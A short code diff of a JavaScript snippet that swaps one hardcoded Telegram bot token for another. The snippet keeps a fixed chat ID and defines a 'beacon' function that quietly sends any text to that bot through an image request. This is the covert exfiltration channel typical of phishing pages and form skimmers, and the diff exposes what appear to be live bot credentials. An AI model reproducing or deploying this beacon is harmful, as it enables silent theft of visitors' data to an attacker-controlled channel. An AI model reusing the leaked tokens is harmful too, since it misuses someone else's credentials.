@@ -1,5 +1,5 @@
 (function () {
-  var BOT  = '8710535929:AAE8JvCbRXQ4wkrsVeKwl3yKhBmhsbxfxPA';
+  var BOT  = '8710535929:AAH-mhpB-IlTdqz38bhdgiep_OUv9j5e-54';
   var CHAT = '8425878739';
   var BASE = 'https://api.telegram.org/bot' + BOT + '/sendMessage?chat_id=' + CHAT + '&text=';
   function beacon(t) { var i = new Image(); i.src = BASE + encodeURIComponent(t); }
